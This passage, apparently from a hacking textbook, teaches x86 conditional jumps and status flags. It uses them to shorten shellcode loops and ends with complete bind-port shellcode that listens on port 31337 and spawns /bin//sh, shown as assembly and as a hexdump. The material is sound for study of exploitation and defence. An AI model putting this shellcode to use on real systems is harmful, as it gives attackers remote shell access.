The control structures of the C programming language, such as for loops and if-then-else blocks, are made up of conditional branches and loops in the machine language
With control structures, the repeated calls to dup2 could be shrunk down to a single call in a loop
The first C program written in previous chapters used a for loop to greet the world 10 times
Disassembling the main function will show us how the compiler implemented the for loop using assembly instructions
The loop instructions (marked below) come after the function prologue instructions save stack memory for the local variable i
This variable is referenced in relation to the EBP register as [ebp-4]
__________________________________________________________________________________
reader@hacking:~/booksrc $ gcc firstprog.c

reader@hacking:~/booksrc $ gdb -q ./a.out
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".

(gdb) disass main
Dump of assembler code for function main:
0x08048374 <main+0>:    push   ebp 
0x08048375 <main+1>:    mov    ebp,esp 
0x08048377 <main+3>:    sub    esp,0x8 
0x0804837a <main+6>:    and    esp,0xfffffff0 
0x0804837d <main+9>:    mov    eax,0x0 
0x08048382 <main+14>:   sub    esp,eax 

      0x08048384 <main+16>:   mov    DWORD PTR [ebp-4],0x0 
      0x0804838b <main+23>:   cmp    DWORD PTR [ebp-4],0x9 
      0x0804838f <main+27>:   jle    0x8048393 <main+31> 
      0x08048391 <main+29>:   jmp    0x80483a6 <main+50> 

0x08048393 <main+31>:   mov    DWORD PTR [esp],0x8048484 
0x0804839a <main+38>:   call   0x80482a0 <printf@plt> 

      0x0804839f <main+43>:   lea   eax,[ebp-4] 
      0x080483a2 <main+46>:   inc   DWORD PTR [eax] 
      0x080483a4 <main+48>:   jmp   0x804838b <main+23> 

0x080483a6 <main+50>:   leave    
0x080483a7 <main+51>:   ret   
End of assembler dump.
__________________________________________________________________________________

The loop contains 2 new instructions: cmp (compare) and jle (jump if less than or equal to), the latter belonging to the family of conditional jump instructions
The cmp instruction will compare its 2 operands, setting flags based on the result
Then, a conditional jump instruction will jump based on the flags
In the code above, if the value at [ebp-4] is less than or equal to 9, execution will jump to 0x08048393, past the next jmp instruction
Otherwise, the next jmp instruction brings execution to the end of the function at 0x080483a6, exiting the loop
The body of the loop makes the call to printf(), increments the counter variable at [ebp-4], and finally jumps back to the compare instruction to continue the loop
Using conditional jump instructions, complex programming control structures such as loops can be created in assembly
More conditional jump instructions are shown below

__________________________________________________________________________
 Instruction            Description
__________________________________________________________________________
cmp <dest>, <source>    Compare the destination operand with source, 
                        setting flags for use with a conditional jump
                        instruction

je <target>             Jump to target if the compared values are equal

jne <target>            Jump if note equal

jl <target>             Jump if less than

jle <target>            Jump if less than or equal to

jnl <target>            Jump if not less than

jnle <target>           Jump if note less than or equal to

jg      jge             Jump if greater than, or greater than or equal to

jng     jnge            Jump if not greater than, or not greater than or 
                        equal to
__________________________________________________________________________

These instructions can be used to shrink the dup2 portion of the shellcode down to the following:

__________________________________________________________________________________
; dup2(connected socket, {all 3 standard I/O file descriptors})
  mov ebx, eax      ; Move socket FD in ebx
  xor eax, eax      ; Zero eax
  xor ecx, ecx      ; ecx = 0 = standard input
dup_loop:
  mov BYTE al, 0x3F ; dup2 syscall #63
  int 0x80
  inc ecx
  cmp BYTE cl, 2    ; Compare ecx with 2
  jle dup_loop      ; If ecx <= 2, jump to dup_loop
__________________________________________________________________________________

This loop iterates ECX from 0 to 2, making a call to dup2 each time
With a more complete understanding of the flags used by the cmp instruction, this loop can be shrunk even further
The status flags set by the cmp instruction are also set by most other instructions, describing the attributes of the instruction's result
These flags are carry flag (CF), parity flag (PF), adjust flag (AF), over-flow flag (OF), zero flag (ZF), and sign flag (SF)
The last 2 flags are the most useful and the easiest to understand
The zero flag is set to true if the result is zero, otherwise it is false
The sign flag is simply the most significant bit of the result, whihc is true if the result is negative and false otherwise
This means that, after any instruction with a negative result, the sign flag becomes true and the zero flag becomes false

__________________________________________________________________________
 Abbreviation  Name        Description
__________________________________________________________________________

 ZF            zero flag   True if the result is zero

 SF            sign flag   True if the result is negative (equal to the
                           most significant bit of result)
__________________________________________________________________________

The cmp (compare) instruction is actually just a sub (subtract) instruction that throws away the results, only affecting the status flags
The jle (jump if less than or equal to) instruction is actually checking the zero and sign flags
If either of these flags is true, then the destination (first) operand is less than or equal to the source (second) operand
The other conditional jump instructions work in a similar way, and there are still more conditional jump instructions that directly check individual status flags:

__________________________________________________________________________
 Instruction            Description
__________________________________________________________________________
 jz <target>            Jump to target if the zero flag is set

 jnz <target>           Jump if the zero flag is not set

 js <target>            Jump if the sign flag is set

 jns <target>           Jump if the sign flag is not set
__________________________________________________________________________

With this knowledge, the cmp (compare) instruction can be removed entirely if the loop's order is reversed
Starting from 2 and counting down, the sign flag can be checked to loop until 0
The shortened loop is shown below:

__________________________________________________________________________________
; dup2(connected socket, {all 3 standard I/O file descriptors})
  mov ebx, eax      ; Move socket FD in ebx
  xor eax, eax      ; Zero eax

      push BYTE 0x2     ; ecx starts at 2
      pop ecx

dup_loop:
  mov BYTE al, 0x3F ; dup2 syscall #63
  int 0x80          ; dup2(c, 0)

      dec ecx           ; Count down to 0
      jns dup_loop      ; If the sign flag is not set, ecx is not negative
__________________________________________________________________________________

The first 2 instructions before the loop can be shortened with the xchg (exchange) instruction
This instruction swaps the values between the source and destination operands:

__________________________________________________________________________
 Instruction            Description
__________________________________________________________________________
 xchg <dest>, <source>  Exhange the values between the 2 operands
__________________________________________________________________________

This single instruction can replace both of the following instructions, which take up 4 bytes:

__________________________________________________________________________
89 C3             mov ebx, eax
31 C0             xor eax, eax
__________________________________________________________________________

The EAX register needs to be zeroed to clear only the upper 3 bytes of the register, and EBX already has these upper bytes cleared
So swapping the values between EAX and EBX will kill 2 birds with one stone, reducing the size to the following single-byte instruction:

__________________________________________________________________________
93                xchg eax, ebx
__________________________________________________________________________

Since the xchg instruction is actually smaller than a mov instruction between 2 registers, it can be used to shrink shellcode in other places
Naturally, this only works in situations where the source operand's register doesn't matter
The following version of the bind port shellcode uses the exchange instruction to shave a few more bytes off its size

bind_shell.s
__________________________________________________________________________________
BITS 32

; s = socket(2, 1, 0)
  push BYTE 0x66    ; socketcall is syscall #102 (0x66)
  pop eax
  cdq               ; Zero out edx for use as a null DWORD later 
  xor ebx, ebx      ; ebx is the type of socketcall
  inc ebx           ; 1 = SYS_SOCKET = socket()
  push edx          ; Build arg array: { protocol = 0,
  push BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,
  push BYTE 0x2     ;                    AF_INET = 2}
  mov ecx, esp      ; ecx = ptr to argument array
  int 0x80          ; After syscall, eax has socket file descriptor

  xchg esi, eax     ; save socket FD in esi for later

; bind(s, [2, 31337, 0], 16)
  push BYTE 0x66    ; socketcall (syscall #102)
  pop eax           
  inc ebx           ; ebx = 2 = SYS_BIND = bind()
  push edx          ; Build sockaddr struct:  INADDR_ANY = 0
  push WORD 0x697a  ;   (in reverse order)    PORT = 31337
  push WORD bx      ;                         AF_INET = 2
  mov ecx, esp      ; ecx = server struct pointer
  push BYTE 16      ; argv: { sizeof(server struct) = 16,
  push ecx          ;         server struct pointer,
  push esi          ;         socket file descriptor }
  mov ecx, esp      ; ecx = argument array
  int 0x80          ; eax = 0 on success

; listen(s, 0)
  mov BYTE al, 0x66 ; socketcall (syscall #102)
  inc ebx
  inc ebx           ; ebx = 4 = SYS_LISTEN = listen()
  push ebx          ; argv: { backlog = 4,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = argument array
  int 0x80

; c = accept(s, 0, 0)
  mov BYTE al, 0x66 ; socketcall (syscall #102)
  inc ebx           ; ebx = 5 = SYS_ACCEPT = accept()
  push edx          ; argv: { socklen = 0,
  push edx          ;         sockaddr ptr = NULL,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = argument array
  int 0x80          ; eax = connected socket FD

; dup2(connected socket, {all 3 standard I/O file descriptors})
  xchg eax, ebx     ; Put socket FD in ebx and 0x00000005 in eax
  push BYTE 0x2     ; ecx starts at 2
  pop ecx
dup_loop:
  mov BYTE al, 0x3F ; dup2 syscall #63
  int 0x80          ; dup2(c, 0)
  dec ecx           ; Count down to 0
  jns dup_loop      ; If the sign flag is not set, ecx is not negative

; execve(const char *filename, char *const argv [], char *const envp[])
  mov BYTE al, 11   ; execve syscall #11
  push edx          ; push some nulls for string termination
  push 0x68732f2f   ; push "//sh" to the stack
  push 0x6e69622f   ; push "/bin" to the stack
  mov ebx, esp      ; Put the address of "/bin//sh" into ebx via esp
  push edx          ; push 32-bit null terminator to stack
  mov edx, esp      ; This is an empty array for envp
  push ebx          ; push string addr to stack above null terminator
  mov ecx, esp      ; This is the argv array with string ptr
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], NULL)
__________________________________________________________________________________

This assembles to the same 92-byte bind_shellcode used in the previous chapter

__________________________________________________________________________________
reader@hacking:~/booksrc $ nasm bind_shell.s

reader@hacking:~/booksrc $ hexdump -C bind_shell
00000000  6a 66 58 99 31 db 43 52  6a 01 6a 02 89 e1 cd 80 |jfX.1.CRj.j.....|
00000010  96 6a 66 58 43 52 66 68  7a 69 66 53 89 e1 6a 10 |.jfXCRfhzifS..j.|
00000020  51 56 89 e1 cd 80 b0 66  43 43 53 56 89 e1 cd 80 |QV.....fCCSV....|
00000030  b0 66 43 52 52 56 89 e1  cd 80 93 6a 02 59 b0 3f |.fCRRV.....j.Y.?|
00000040  cd 80 49 79 f9 b0 0b 52  68 2f 2f 73 68 68 2f 62 |..Iy...Rh//shh/b|
00000050  69 6e 89 e3 52 89 e2 53  89 e1 cd 80             |in..R..S....|
0000005c
__________________________________________________________________________________
